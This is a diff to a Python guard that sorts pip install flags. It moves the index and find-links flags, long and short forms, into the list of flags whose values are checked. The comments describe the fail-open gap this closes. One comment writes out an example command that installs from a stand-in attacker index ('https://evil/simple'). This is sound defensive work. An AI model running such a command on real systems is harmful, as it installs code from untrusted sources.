@@ -49,6 +49,12 @@ PIP_WHITELIST_VALIDATED_AGAINST = "26.1.1"
 PIP_UNREADABLE_TARGET_FLAGS_LONG = (
     "--requirement", "--editable", "--constraint", "--build-constraint",
     "--requirements-from-script", "--group",
+    # Round 5: an index or a link page is a place whose contents decide what gets installed, which is this
+    # list's definition, so these three belong here and not on the destination list. They were on it, and
+    # were caught only by `PIP_FROM_NETWORK` naming them as literals - which left this guard silently
+    # skipping their values, and left the short forms `-f`/`-i` uncovered entirely (see the letter sets
+    # below). Both guards now agree on the whole "names a package source" family, in both spellings.
+    "--index-url", "--extra-index-url", "--find-links",
 )
 
 # Long flags confidently known to take a value that is NOT an install source - a destination directory, an
@@ -59,7 +65,7 @@ PIP_UNREADABLE_TARGET_FLAGS_LONG = (
 PIP_DESTINATION_VALUE_FLAGS_LONG = (
     "--target", "--root", "--prefix", "--src", "--cache-dir", "--log", "--python",
     "--platform", "--python-version", "--implementation", "--abi", "--proxy", "--retries", "--timeout",
-    "--progress-bar", "--report", "--index-url", "--extra-index-url", "--find-links", "--trusted-host",
+    "--progress-bar", "--report", "--trusted-host",
     "--cert", "--client-cert", "--upgrade-strategy", "--config-settings",
     "--no-binary", "--only-binary", "--exists-action", "--root-user-action",
     "--all-releases", "--only-final", "--uploaded-prior-to", "--keyring-provider",
@@ -80,8 +86,17 @@ PIP_BOOLEAN_FLAGS_LONG = (
 # Single letters pip's `install` recognizes as short options, UNBUNDLED (see `pip_indirect_targets` for
 # why a bundle of two or more is never resolved at all): which spell an unreadable target, which take a
 # value that is a destination rather than a source, and which take no value.
-PIP_UNREADABLE_TARGET_LETTERS = set("rce")  # -r requirement / -c constraint / -e editable
-PIP_DESTINATION_VALUE_LETTERS = set("tCif")  # -t target / -C config-settings / -i index-url / -f find-links
+# -r requirement / -c constraint / -e editable, and -f find-links / -i index-url: all five name a place
+# whose *contents* decide what gets installed, which is this file's definition of an unreadable target.
+# `-f`/`-i` moved here in round 5. Their long forms have always been treated as dangerous - `--find-links`
+# and `--index-url` are literals in `PIP_FROM_NETWORK` - but the short forms were listed below as ordinary
+# destination-value flags, so their value was skipped and neither guard looked at it:
+# `pip install -f /local/wheels requests` and `pip install -i /local/index requests` were both green while
+# the long spellings were red. `pip install -i https://evil/simple requests` was caught only incidentally,
+# by `PIP_FROM_NETWORK` matching the `https://` in the value rather than the flag. Same short/long
+# asymmetry round 4 found in the harmless direction with `-q`/`--quiet`; this is its fail-open direction.
+PIP_UNREADABLE_TARGET_LETTERS = set("rcefi")
+PIP_DESTINATION_VALUE_LETTERS = set("tC")  # -t target (an output dir) / -C config-settings (a build option)
 PIP_BOOLEAN_LETTERS = set("qvUIhV")  # -q quiet / -v verbose / -U upgrade / -I ignore-installed / -h help / -V version
 
 # A PEP 508 dependency specification and nothing else: a PEP 503 project name, optional extras, optional
